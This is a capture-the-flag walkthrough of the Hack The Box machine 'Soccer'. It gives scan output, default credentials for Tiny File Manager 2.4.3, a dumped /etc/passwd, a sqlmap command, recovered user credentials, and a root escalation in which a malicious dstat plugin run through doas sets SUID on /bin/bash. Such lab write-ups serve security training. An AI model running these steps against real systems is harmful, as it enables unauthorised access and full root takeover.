# Soccer - Hack the Box

## Information gathering


### Nmap

`nmap -sC -sV 10.10.11.194 -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-05 20:30 EST
Nmap scan report for 10.10.11.194
Host is up (0.052s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Fri, 06 Jan 2023 01:36:46 GMT
|     Connection: close`


### Go Buster


> gobuster dir -u http://soccer.htb -w /opt/SecLists/Discovery/Web-Content/directory-list-1.0.txt -t 50 
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soccer.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/05 20:53:50 Starting gobuster in directory enumeration mode
===============================================================
/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
Progress: 141653 / 141709 (99.96%)
===============================================================
2023/01/05 20:57:22 Finished
===============================================================
`

We found a cool hidden directory. http://soccer.htb/tiny/
And when we go to this webpage we're presented with a login screen for "Tiny File Manager" by H3k
Let's search up and see if that means anything
We viewed the page source to find the version is 2.4.3
Luck for us there is a CVE Exploit on Github for this version:

https://github.com/febinrev/tinyfilemanager-2.4.3-exploit

`$ cat /etc/passwd                                                            
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:112:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
player:x:1001:1001::/home/player:/bin/bash
mysql:x:113:121:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:997:997::/var/log/laurel:/bin/false
`
http://soccer.htb/tiny/ direcotory has a vulnerable login page with default creds
Username admin Password admin@123

### Grab Foothold


> python3 -c "import pty;pty.spawn('/bin/bash')" 
Elevate the session to a true bash session


> sqlmap -u “http://localhost:8081/?id=1" -p “id”
User with python script in ~/Documents/htb_pentesting/htb_soccer


username: player
password: PlayerOftheMatch2022
id: 1324
email: player@player.htb

### Escalate privileges

```
player@soccer:/usr/local/share/dstat$ echo 'import os;os.system("chmod u+s /bin/bash")' > dstat_privesc.py
player@soccer:/usr/local/share/dstat$ doas -u root /usr/bin/dstat --privesc &>/dev/null
player@soccer:/usr/local/share/dstat$
```

```
player@soccer:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
player@soccer:~$ bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt 
694**************************8b4
bash-5.0#

```